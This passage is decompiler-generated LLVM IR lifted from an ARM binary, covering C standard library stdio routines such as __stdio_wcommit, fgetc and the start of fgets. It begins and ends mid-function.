  br i1 %v9_15d2c, label %dec_label_pc_15d34, label %dec_label_pc_15d4c

dec_label_pc_15d34:                               ; preds = %dec_label_pc_15d28
  store i32 %v2_15d28, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_15d44 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_15d44, label %dec_label_pc_15d48, label %dec_label_pc_15d28

dec_label_pc_15d48:                               ; preds = %dec_label_pc_15d34
  %v0_15d48 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_15d48, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15d4c

dec_label_pc_15d4c:                               ; preds = %dec_label_pc_15d28, %dec_label_pc_15d48
  %v0_15d4c = phi i32 [ %v0_15d48, %dec_label_pc_15d48 ], [ %v2_15d28, %dec_label_pc_15d28 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15d4c = icmp eq i32 %v0_15d4c, 0
  %v2_15d58.pre = load i32, i32* %r5.global-to-local, align 4
  br i1 %v2_15d4c, label %.thread5, label %bb

.thread5:                                         ; preds = %dec_label_pc_15d4c
  %v1_15d58 = load i32, i32* %r6.global-to-local, align 4
  %v3_15d58 = add i32 %v2_15d58.pre, 64
  %v4_15d58 = inttoptr i32 %v3_15d58 to i32*
  store i32 %v1_15d58, i32* %v4_15d58, align 4
  %v1_15d5c = load i32, i32* %r1.global-to-local, align 4
  %v2_15d5c = load i32, i32* %r5.global-to-local, align 4
  %v3_15d5c = add i32 %v2_15d5c, 60
  %v4_15d5c = inttoptr i32 %v3_15d5c to i32*
  store i32 %v1_15d5c, i32* %v4_15d5c, align 4
  br label %.thread10

bb:                                               ; preds = %dec_label_pc_15d4c
  %v2_15d50 = add i32 %v2_15d58.pre, 8
  %v3_15d50 = inttoptr i32 %v2_15d50 to i32*
  %v4_15d50 = load i32, i32* %v3_15d50, align 4
  store i32 %v4_15d50, i32* %r3.global-to-local, align 4
  store i32 48, i32* %r2.global-to-local, align 4
  %v3_15d60 = add i32 %v2_15d58.pre, 20
  %v4_15d60 = inttoptr i32 %v3_15d60 to i32*
  store i32 %v4_15d50, i32* %v4_15d60, align 4
  %v1_15d64 = load i32, i32* %r2.global-to-local, align 4
  %v2_15d64 = trunc i32 %v1_15d64 to i16
  %v3_15d64 = load i32, i32* %r5.global-to-local, align 4
  %v4_15d64 = inttoptr i32 %v3_15d64 to i16*
  store i16 %v2_15d64, i16* %v4_15d64, align 2
  %v1_15d68 = load i32, i32* %r3.global-to-local, align 4
  %v2_15d68 = load i32, i32* %r5.global-to-local, align 4
  %v3_15d68 = add i32 %v2_15d68, 24
  %v4_15d68 = inttoptr i32 %v3_15d68 to i32*
  store i32 %v1_15d68, i32* %v4_15d68, align 4
  %v1_15d6c = load i32, i32* %r3.global-to-local, align 4
  %v2_15d6c = load i32, i32* %r5.global-to-local, align 4
  %v3_15d6c = add i32 %v2_15d6c, 28
  %v4_15d6c = inttoptr i32 %v3_15d6c to i32*
  store i32 %v1_15d6c, i32* %v4_15d6c, align 4
  %v1_15d70 = load i32, i32* %r3.global-to-local, align 4
  %v2_15d70 = load i32, i32* %r5.global-to-local, align 4
  %v3_15d70 = add i32 %v2_15d70, 16
  %v4_15d70 = inttoptr i32 %v3_15d70 to i32*
  store i32 %v1_15d70, i32* %v4_15d70, align 4
  br label %.thread10

.thread10:                                        ; preds = %.thread1, %.thread5, %bb
  %v0_15d74 = load i32, i32* %sl.global-to-local, align 4
  %v1_15d74 = inttoptr i32 %v0_15d74 to i32*
  %v2_15d74 = load i32, i32* %v1_15d74, align 4
  store i32 %v2_15d74, i32* %r0.global-to-local, align 4
  %v3_15d74 = add i32 %v0_15d74, 4
  %v4_15d74 = inttoptr i32 %v3_15d74 to i32*
  %v5_15d74 = load i32, i32* %v4_15d74, align 4
  store i32 %v5_15d74, i32* %r1.global-to-local, align 4
  %v6_15d74 = add i32 %v0_15d74, 8
  %v7_15d74 = inttoptr i32 %v6_15d74 to i32*
  %v8_15d74 = load i32, i32* %v7_15d74, align 4
  store i32 %v8_15d74, i32* %r2.global-to-local, align 4
  %v1_15d7c = load i32, i32* %r5.global-to-local, align 4
  %v2_15d7c = add i32 %v1_15d7c, 52
  %v3_15d7c = inttoptr i32 %v2_15d7c to i32*
  store i32 1, i32* %v3_15d7c, align 4
  %v0_15d80 = load i32, i32* %r5.global-to-local, align 4
  %v1_15d80 = add i32 %v0_15d80, 56
  store i32 %v1_15d80, i32* %r3.global-to-local, align 4
  %v2_15d84 = load i32, i32* %r0.global-to-local, align 4
  %v1_15d88 = inttoptr i32 %v1_15d80 to i32*
  store i32 %v2_15d84, i32* %v1_15d88, align 4
  %v3_15d88 = add i32 %v0_15d80, 60
  %v4_15d88 = inttoptr i32 %v3_15d88 to i32*
  %v5_15d88 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_15d88, i32* %v4_15d88, align 4
  %v6_15d88 = add i32 %v0_15d80, 64
  %v7_15d88 = inttoptr i32 %v6_15d88 to i32*
  %v8_15d88 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_15d88, i32* %v7_15d88, align 4
  %v0_15d8c = load i32, i32* %r5.global-to-local, align 4
  %v1_15d8c = add i32 %v0_15d8c, 32
  %v2_15d8c = inttoptr i32 %v1_15d8c to i32*
  %v3_15d8c = load i32, i32* %v2_15d8c, align 4
  store i32 %v3_15d8c, i32* %r5.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15d90 = icmp eq i32 %v3_15d8c, 0
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_15d98 = add i32 %v3_15d8c, 56
  store i32 %v1_15d98, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br i1 %v2_15d90, label %dec_label_pc_15da4, label %dec_label_pc_15d08

dec_label_pc_15da4:                               ; preds = %.thread10, %entry
  store i32 76, i32* %r3.global-to-local, align 4
  %v0_15da8 = load i32, i32* %r7.global-to-local, align 4
  %v2_15da8 = add i32 %v0_15da8, 76
  %v3_15da8 = inttoptr i32 %v2_15da8 to i32*
  %v4_15da8 = load i32, i32* %v3_15da8, align 4
  store i32 %v4_15da8, i32* %r3.global-to-local, align 4
  %storemerge.in11 = inttoptr i32 %v4_15da8 to i32*
  %storemerge12 = load i32, i32* %storemerge.in11, align 4
  store i32 %storemerge12, i32* %r4.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15dc814 = icmp eq i32 %storemerge12, 0
  br i1 %v2_15dc814, label %dec_label_pc_15dd0, label %dec_label_pc_15db4

dec_label_pc_15db4:                               ; preds = %dec_label_pc_15da4, %dec_label_pc_15dc8
  %v1_15dbc = phi i32 [ %storemerge, %dec_label_pc_15dc8 ], [ %storemerge12, %dec_label_pc_15da4 ]
  %v1_15db4 = inttoptr i32 %v1_15dbc to i16*
  %v2_15db4 = load i16, i16* %v1_15db4, align 2
  %v3_15db4 = zext i16 %v2_15db4 to i32
  store i32 %v3_15db4, i32* %r3.global-to-local, align 4
  %v1_15db8 = and i32 %v3_15db4, 64
  %v2_15db8 = icmp eq i32 %v1_15db8, 0
  br i1 %v2_15db8, label %dec_label_pc_15dc8, label %bb39

bb39:                                             ; preds = %dec_label_pc_15db4
  store i32 %v1_15dbc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15dc8

dec_label_pc_15dc8:                               ; preds = %dec_label_pc_15db4, %bb39
  %v1_15dc0 = xor i1 %v2_15db8, true
  call void @__pseudo_cond_branch(i1 %v1_15dc0, i32 ptrtoint (i32* @global_var_15df8.588 to i32))
  %v0_15dc4 = load i32, i32* %r4.global-to-local, align 4
  %v1_15dc4 = add i32 %v0_15dc4, 32
  %storemerge.in = inttoptr i32 %v1_15dc4 to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %storemerge, i32* %r4.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15dc8 = icmp eq i32 %storemerge, 0
  br i1 %v2_15dc8, label %dec_label_pc_15dd0, label %dec_label_pc_15db4

dec_label_pc_15dd0:                               ; preds = %dec_label_pc_15dc8, %dec_label_pc_15da4
  %v2_15dd4 = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_15dd4, i32* %r4.global-to-local, align 4
  %v1_15dd8 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_15dd8

; uselistorder directives
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v3_15d8c, { 1, 2, 3, 0 }
  uselistorder i32 %v1_15d2c, { 1, 0 }
  uselistorder i32 %v4_15cec, { 2, 1, 0 }
  uselistorder i32 %v4_15cbc, { 2, 1, 0 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 11, 9, 10, 12 }
  uselistorder i32* %r4.global-to-local, { 0, 2, 3, 4, 1, 5, 6, 7 }
  uselistorder i32* %r2.global-to-local, { 4, 0, 1, 2, 3, 12, 13, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32* %r1.global-to-local, { 2, 0, 1, 10, 11, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder i32* %r0.global-to-local, { 4, 0, 1, 2, 3, 9, 5, 6, 7, 8 }
  uselistorder i1* %cpsr_c.global-to-local, { 1, 7, 6, 2, 3, 4, 5, 0 }
  uselistorder label %dec_label_pc_15dc8, { 1, 0 }
  uselistorder label %dec_label_pc_15db4, { 1, 0 }
  uselistorder label %.thread10, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15d4c, { 1, 0 }
  uselistorder label %dec_label_pc_15d28, { 1, 0 }
  uselistorder label %dec_label_pc_15d08, { 1, 0 }
}

define i32 @__stdio_wcommit(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_15df8 = load i32, i32* @r4, align 4
  store i32 %v3_15df8, i32* %stack_var_-8, align 4
  %v1_15dfc = add i32 %arg1, 8
  %v2_15dfc = inttoptr i32 %v1_15dfc to i32*
  %v3_15dfc = load i32, i32* %v2_15dfc, align 4
  store i32 %v3_15dfc, i32* @r1, align 4
  %v1_15e00 = add i32 %arg1, 16
  %v2_15e00 = inttoptr i32 %v1_15e00 to i32*
  %v3_15e00 = load i32, i32* %v2_15e00, align 4
  %v9_15e04 = icmp eq i32 %v3_15e00, %v3_15dfc
  store i32 %arg1, i32* %r4.global-to-local, align 4
  br i1 %v9_15e04, label %bb3, label %bb

bb:                                               ; preds = %entry
  store i32 %v3_15dfc, i32* %v2_15e00, align 4
  br label %bb3

bb3:                                              ; preds = %entry, %bb
  %v1_15e10 = xor i1 %v9_15e04, true
  call void @__pseudo_cond_branch(i1 %v1_15e10, i32 ptrtoint (i32* @global_var_177e8.589 to i32))
  %v0_15e14 = load i32, i32* %r4.global-to-local, align 4
  %v1_15e14 = add i32 %v0_15e14, 8
  %v2_15e14 = inttoptr i32 %v1_15e14 to i32*
  %v3_15e14 = load i32, i32* %v2_15e14, align 4
  %v1_15e18 = add i32 %v0_15e14, 16
  %v2_15e18 = inttoptr i32 %v1_15e18 to i32*
  %v3_15e18 = load i32, i32* %v2_15e18, align 4
  %v2_15e1c = sub i32 %v3_15e18, %v3_15e14
  %v2_15e20 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_15e20, i32* @r4, align 4
  ret i32 %v2_15e1c

; uselistorder directives
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %bb3, { 1, 0 }
}

define i32 @__GI_fgetc(i32 %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_15e28 = load i32, i32* @r4, align 4
  store i32 %v3_15e28, i32* %stack_var_-20, align 4
  %v6_15e28 = load i32, i32* @r5, align 4
  %v9_15e28 = load i32, i32* @r6, align 4
  %v12_15e28 = load i32, i32* @r7, align 4
  %v15_15e28 = load i32, i32* @lr, align 4
  %v1_15e2c = add i32 %arg1, 52
  %v2_15e2c = inttoptr i32 %v1_15e2c to i32*
  %v3_15e2c = load i32, i32* %v2_15e2c, align 4
  store i32 %v3_15e2c, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15e30 = icmp eq i32 %v3_15e2c, 0
  store i32 %arg1, i32* @r7, align 4
  br i1 %v2_15e30, label %dec_label_pc_15e64, label %dec_label_pc_15e40

dec_label_pc_15e40:                               ; preds = %entry
  %v1_15e40 = add i32 %arg1, 16
  %v2_15e40 = inttoptr i32 %v1_15e40 to i32*
  %v3_15e40 = load i32, i32* %v2_15e40, align 4
  store i32 %v3_15e40, i32* %r2.global-to-local, align 4
  %v1_15e44 = add i32 %arg1, 24
  %v2_15e44 = inttoptr i32 %v1_15e44 to i32*
  %v3_15e44 = load i32, i32* %v2_15e44, align 4
  store i32 %v3_15e44, i32* %r3.global-to-local, align 4
  %v3_15e48 = icmp uge i32 %v3_15e40, %v3_15e44
  store i1 %v3_15e48, i1* %cpsr_c.global-to-local, align 1
  br i1 %v3_15e48, label %dec_label_pc_15e58, label %.thread

.thread:                                          ; preds = %dec_label_pc_15e40
  %v2_15e4c = inttoptr i32 %v3_15e40 to i8*
  %v3_15e4c = load i8, i8* %v2_15e4c, align 1
  %v4_15e4c = zext i8 %v3_15e4c to i32
  store i32 %v4_15e4c, i32* %r5.global-to-local, align 4
  %v6_15e4c = add i32 %v3_15e40, 1
  store i32 %v6_15e4c, i32* %r2.global-to-local, align 4
  store i32 %v6_15e4c, i32* %v2_15e40, align 4
  br label %dec_label_pc_15f5c

dec_label_pc_15e58:                               ; preds = %dec_label_pc_15e40
  %v1_15e58 = inttoptr i32 %arg1 to i16*
  %v2_15e58 = call i32 @getc_unlocked(i16* %v1_15e58)
  store i32 %v2_15e58, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_15f5c

dec_label_pc_15e64:                               ; preds = %entry
  %v0_15e64 = call i32 @__aeabi_read_tp()
  %v0_15e68 = load i32, i32* @r7, align 4
  %v1_15e68 = add i32 %v0_15e68, 64
  %v2_15e68 = inttoptr i32 %v1_15e68 to i32*
  %v3_15e68 = load i32, i32* %v2_15e68, align 4
  store i32 %v3_15e68, i32* %r3.global-to-local, align 4
  %v1_15e6c = add i32 %v0_15e64, -1168
  store i32 %v1_15e6c, i32* @r6, align 4
  %v3_15e70 = icmp uge i32 %v3_15e68, %v1_15e6c
  store i1 %v3_15e70, i1* %cpsr_c.global-to-local, align 1
  %v9_15e70 = icmp eq i32 %v3_15e68, %v1_15e6c
  br i1 %v9_15e70, label %dec_label_pc_15eb8, label %dec_label_pc_15e78

dec_label_pc_15e78:                               ; preds = %dec_label_pc_15e64
  %v1_15e78 = add i32 %v0_15e68, 56
  store i32 %v1_15e78, i32* @r5, align 4
  store i32 %v1_15e78, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_15e84

dec_label_pc_15e84:                               ; preds = %dec_label_pc_15e90.dec_label_pc_15e84_crit_edge, %dec_label_pc_15e78
  %v0_15e84 = phi i32 [ %v0_15e84.pre, %dec_label_pc_15e90.dec_label_pc_15e84_crit_edge ], [ %v1_15e78, %dec_label_pc_15e78 ]
  %v1_15e84 = inttoptr i32 %v0_15e84 to i32*
  %v2_15e84 = load i32, i32* %v1_15e84, align 4
  store i32 %v2_15e84, i32* %r3.global-to-local, align 4
  %v1_15e88 = load i32, i32* @r4, align 4
  %v3_15e88 = icmp uge i32 %v2_15e84, %v1_15e88
  store i1 %v3_15e88, i1* %cpsr_c.global-to-local, align 1
  %v9_15e88 = icmp eq i32 %v2_15e84, %v1_15e88
  br i1 %v9_15e88, label %dec_label_pc_15e90, label %dec_label_pc_15ea8

dec_label_pc_15e90:                               ; preds = %dec_label_pc_15e84
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_15ea0 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_15ea0, label %dec_label_pc_15ea4, label %dec_label_pc_15e90.dec_label_pc_15e84_crit_edge

dec_label_pc_15e90.dec_label_pc_15e84_crit_edge:  ; preds = %dec_label_pc_15e90
  %v0_15e84.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_15e84

dec_label_pc_15ea4:                               ; preds = %dec_label_pc_15e90
  %v0_15ea4 = load i32, i32* @r4, align 4
  store i32 %v0_15ea4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15ea8

dec_label_pc_15ea8:                               ; preds = %dec_label_pc_15e84, %dec_label_pc_15ea4
  %v0_15ea8 = phi i32 [ %v0_15ea4, %dec_label_pc_15ea4 ], [ %v2_15e84, %dec_label_pc_15e84 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15ea8 = icmp eq i32 %v0_15ea8, 0
  br i1 %v2_15ea8, label %bb18, label %bb

bb:                                               ; preds = %dec_label_pc_15ea8
  br label %bb18

bb18:                                             ; preds = %dec_label_pc_15ea8, %bb
  store i32 89780, i32* @lr, align 4
  %v1_15eb0 = xor i1 %v2_15ea8, true
  call void @__pseudo_cond_branch(i1 %v1_15eb0, i32 ptrtoint (i32* @global_var_13c8c.468 to i32))
  %v0_15eb4 = load i32, i32* @r6, align 4
  %v1_15eb4 = load i32, i32* @r7, align 4
  %v2_15eb4 = add i32 %v1_15eb4, 64
  %v3_15eb4 = inttoptr i32 %v2_15eb4 to i32*
  store i32 %v0_15eb4, i32* %v3_15eb4, align 4
  %v0_15eb8.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_15eb8

dec_label_pc_15eb8:                               ; preds = %dec_label_pc_15e64, %bb18
  %v1_15ec8 = phi i32 [ %v0_15e68, %dec_label_pc_15e64 ], [ %v0_15eb8.pre, %bb18 ]
  %v1_15eb8 = add i32 %v1_15ec8, 60
  %v2_15eb8 = inttoptr i32 %v1_15eb8 to i32*
  %v3_15eb8 = load i32, i32* %v2_15eb8, align 4
  store i32 %v3_15eb8, i32* %r2.global-to-local, align 4
  %v1_15ebc = add i32 %v1_15ec8, 16
  %v2_15ebc = inttoptr i32 %v1_15ebc to i32*
  %v3_15ebc = load i32, i32* %v2_15ebc, align 4
  store i32 %v3_15ebc, i32* @r1, align 4
  %v1_15ec0 = add i32 %v1_15ec8, 24
  %v2_15ec0 = inttoptr i32 %v1_15ec0 to i32*
  %v3_15ec0 = load i32, i32* %v2_15ec0, align 4
  store i32 %v3_15ec0, i32* %r3.global-to-local, align 4
  %v1_15ec4 = add i32 %v3_15eb8, 1
  store i32 %v1_15ec4, i32* %r2.global-to-local, align 4
  store i32 %v1_15ec4, i32* %v2_15eb8, align 4
  %v0_15ecc = load i32, i32* @r1, align 4
  %v1_15ecc = load i32, i32* %r3.global-to-local, align 4
  %v3_15ecc = icmp uge i32 %v0_15ecc, %v1_15ecc
  store i1 %v3_15ecc, i1* %cpsr_c.global-to-local, align 1
  br i1 %v3_15ecc, label %dec_label_pc_15edc, label %.thread2

.thread2:                                         ; preds = %dec_label_pc_15eb8
  %v2_15ed0 = inttoptr i32 %v0_15ecc to i8*
  %v3_15ed0 = load i8, i8* %v2_15ed0, align 1
  %v4_15ed0 = zext i8 %v3_15ed0 to i32
  store i32 %v4_15ed0, i32* %r5.global-to-local, align 4
  %v6_15ed0 = add i32 %v0_15ecc, 1
  store i32 %v6_15ed0, i32* @r1, align 4
  %v2_15ed4 = load i32, i32* @r7, align 4
  %v3_15ed4 = add i32 %v2_15ed4, 16
  %v4_15ed4 = inttoptr i32 %v3_15ed4 to i32*
  store i32 %v6_15ed0, i32* %v4_15ed4, align 4
  br label %dec_label_pc_15ee8

dec_label_pc_15edc:                               ; preds = %dec_label_pc_15eb8
  %v0_15edc = load i32, i32* @r7, align 4
  %v1_15ee0 = inttoptr i32 %v0_15edc to i16*
  %v2_15ee0 = call i32 @getc_unlocked(i16* %v1_15ee0)
  store i32 %v2_15ee0, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_15ee8

dec_label_pc_15ee8:                               ; preds = %.thread2, %dec_label_pc_15edc
  %v0_15ee8 = load i32, i32* @r7, align 4
  %v1_15ee8 = add i32 %v0_15ee8, 60
  %v2_15ee8 = inttoptr i32 %v1_15ee8 to i32*
  %v3_15ee8 = load i32, i32* %v2_15ee8, align 4
  %v1_15eec = add i32 %v3_15ee8, -1
  store i32 %v1_15eec, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15ef0 = icmp eq i32 %v1_15eec, 0
  store i32 %v1_15eec, i32* %v2_15ee8, align 4
  br i1 %v2_15ef0, label %dec_label_pc_15efc, label %dec_label_pc_15f5c

dec_label_pc_15efc:                               ; preds = %dec_label_pc_15ee8
  %v0_15efc = load i32, i32* %r3.global-to-local, align 4
  %v1_15efc = load i32, i32* @r7, align 4
  %v2_15efc = add i32 %v1_15efc, 64
  %v3_15efc = inttoptr i32 %v2_15efc to i32*
  store i32 %v0_15efc, i32* %v3_15efc, align 4
  %v0_15f00 = load i32, i32* @r7, align 4
  %v1_15f00 = add i32 %v0_15f00, 56
  store i32 %v1_15f00, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_15f04

dec_label_pc_15f04:                               ; preds = %dec_label_pc_15f34.dec_label_pc_15f04_crit_edge, %dec_label_pc_15efc
  %v0_15f0c = phi i32 [ %v0_15f0c.pre, %dec_label_pc_15f34.dec_label_pc_15f04_crit_edge ], [ %v1_15f00, %dec_label_pc_15efc ]
  %v0_15f04 = phi i32 [ %v0_15f04.pre, %dec_label_pc_15f34.dec_label_pc_15f04_crit_edge ], [ %v0_15f00, %dec_label_pc_15efc ]
  %v1_15f04 = add i32 %v0_15f04, 56
  %v2_15f04 = inttoptr i32 %v1_15f04 to i32*
  %v3_15f04 = load i32, i32* %v2_15f04, align 4
  store i32 %v3_15f04, i32* %r4.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 %v0_15f0c, i32* %r2.global-to-local, align 4
  %v1_15f1022 = inttoptr i32 %v0_15f0c to i32*
  %v2_15f1023 = load i32, i32* %v1_15f1022, align 4
  store i32 %v2_15f1023, i32* %r3.global-to-local, align 4
  %v3_15f1425 = icmp uge i32 %v2_15f1023, %v3_15f04
  store i1 %v3_15f1425, i1* %cpsr_c.global-to-local, align 1
  %v9_15f1431 = icmp eq i32 %v2_15f1023, %v3_15f04
  br i1 %v9_15f1431, label %dec_label_pc_15f1c, label %dec_label_pc_15f34

dec_label_pc_15f1c:                               ; preds = %dec_label_pc_15f04, %dec_label_pc_15f1c.dec_label_pc_15f10_crit_edge
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_15f2c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_15f2c, label %dec_label_pc_15f30, label %dec_label_pc_15f1c.dec_label_pc_15f10_crit_edge

dec_label_pc_15f1c.dec_label_pc_15f10_crit_edge:  ; preds = %dec_label_pc_15f1c
  %v0_15f10.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_15f14.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_15f10 = inttoptr i32 %v0_15f10.pre to i32*
  %v2_15f10 = load i32, i32* %v1_15f10, align 4
  store i32 %v2_15f10, i32* %r3.global-to-local, align 4
  %v3_15f14 = icmp uge i32 %v2_15f10, %v1_15f14.pre
  store i1 %v3_15f14, i1* %cpsr_c.global-to-local, align 1
  %v9_15f14 = icmp eq i32 %v2_15f10, %v1_15f14.pre
  br i1 %v9_15f14, label %dec_label_pc_15f1c, label %dec_label_pc_15f34

dec_label_pc_15f30:                               ; preds = %dec_label_pc_15f1c
  %v0_15f30 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_15f30, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15f34

dec_label_pc_15f34:                               ; preds = %dec_label_pc_15f04, %dec_label_pc_15f1c.dec_label_pc_15f10_crit_edge, %dec_label_pc_15f30
  %v0_15f3c = phi i32 [ %v0_15f30, %dec_label_pc_15f30 ], [ %v2_15f1023, %dec_label_pc_15f04 ], [ %v2_15f10, %dec_label_pc_15f1c.dec_label_pc_15f10_crit_edge ]
  %v1_15f34 = phi i32 [ %v0_15f30, %dec_label_pc_15f30 ], [ %v3_15f04, %dec_label_pc_15f04 ], [ %v1_15f14.pre, %dec_label_pc_15f1c.dec_label_pc_15f10_crit_edge ]
  %v3_15f34 = icmp uge i32 %v0_15f3c, %v1_15f34
  store i1 %v3_15f34, i1* %cpsr_c.global-to-local, align 1
  %v9_15f34 = icmp eq i32 %v0_15f3c, %v1_15f34
  br i1 %v9_15f34, label %dec_label_pc_15f3c, label %dec_label_pc_15f34.dec_label_pc_15f04_crit_edge

dec_label_pc_15f34.dec_label_pc_15f04_crit_edge:  ; preds = %dec_label_pc_15f34
  %v0_15f04.pre = load i32, i32* @r7, align 4
  %v0_15f0c.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_15f04

dec_label_pc_15f3c:                               ; preds = %dec_label_pc_15f34
  %v2_15f3c = icmp ne i32 %v1_15f34, 0
  store i1 %v2_15f3c, i1* %cpsr_c.global-to-local, align 1
  %v7_15f40 = icmp slt i32 %v1_15f34, 2
  br i1 %v7_15f40, label %dec_label_pc_15f5c, label %dec_label_pc_15f44

dec_label_pc_15f44:                               ; preds = %dec_label_pc_15f3c
  %v0_15f48 = load i32, i32* @r1, align 4
  %v1_15f48 = add i32 %v0_15f48, 129
  store i32 %v1_15f48, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15f5c

dec_label_pc_15f5c:                               ; preds = %.thread, %dec_label_pc_15ee8, %dec_label_pc_15f44, %dec_label_pc_15f3c, %dec_label_pc_15e58
  %v0_15f5c = load i32, i32* %r5.global-to-local, align 4
  %v2_15f64 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_15f64, i32* @r4, align 4
  store i32 %v6_15e28, i32* @r5, align 4
  store i32 %v9_15e28, i32* @r6, align 4
  store i32 %v12_15e28, i32* @r7, align 4
  store i32 %v15_15e28, i32* @lr, align 4
  ret i32 %v0_15f5c

; uselistorder directives
  uselistorder i32 %v0_15f30, { 1, 0, 2 }
  uselistorder i32 %v1_15f14.pre, { 0, 2, 1 }
  uselistorder i32 %v0_15ecc, { 1, 0, 2 }
  uselistorder i32 %v1_15ec8, { 0, 2, 1 }
  uselistorder i32 %v1_15e88, { 1, 0 }
  uselistorder i32 %v3_15e40, { 1, 0, 2, 3 }
  uselistorder i32* %r5.global-to-local, { 3, 0, 1, 2, 4 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 3, 2, 13, 4, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 1, 2, 11, 12, 3, 4, 5, 6, 7, 8, 9, 10 }
  uselistorder i32 %arg1, { 0, 2, 1, 4, 3 }
  uselistorder label %dec_label_pc_15f5c, { 2, 3, 1, 4, 0 }
  uselistorder label %dec_label_pc_15f34, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15f1c, { 1, 0 }
  uselistorder label %dec_label_pc_15ee8, { 1, 0 }
  uselistorder label %dec_label_pc_15eb8, { 1, 0 }
  uselistorder label %bb18, { 1, 0 }
  uselistorder label %dec_label_pc_15ea8, { 1, 0 }
}

define i32 @fgets(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_15f6c = load i32, i32* @r4, align 4
  store i32 %v3_15f6c, i32* %stack_var_-32, align 4
  %v6_15f6c = load i32, i32* @r5, align 4
  %v9_15f6c = load i32, i32* @r6, align 4
  %v12_15f6c = load i32, i32* @r7, align 4
  %v15_15f6c = load i32, i32* @r8, align 4
  %v24_15f6c = load i32, i32* @lr, align 4
  %v1_15f70 = add i32 %arg3, 52
  %v2_15f70 = inttoptr i32 %v1_15f70 to i32*
  %v3_15f70 = load i32, i32* %v2_15f70, align 4
  store i32 %v3_15f70, i32* @r6, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15f74 = icmp eq i32 %v3_15f70, 0
  store i32 %arg3, i32* @r7, align 4
  store i32 %arg1, i32* %sl.global-to-local, align 4
  store i32 %arg2, i32* %sb.global-to-local, align 4
  br i1 %v2_15f74, label %dec_label_pc_15f88, label %dec_label_pc_15fec

dec_label_pc_15f88:                               ; preds = %entry
  %v0_15f88 = call i32 @__aeabi_read_tp()
  %v1_15f8c = add i32 %arg3, 64
  %v2_15f8c = inttoptr i32 %v1_15f8c to i32*
  %v3_15f8c = load i32, i32* %v2_15f8c, align 4
  store i32 %v3_15f8c, i32* %r3.global-to-local, align 4
  %v1_15f90 = add i32 %v0_15f88, -1168
  store i32 %v1_15f90, i32* @r8, align 4
  %v3_15f94 = icmp uge i32 %v3_15f8c, %v1_15f90
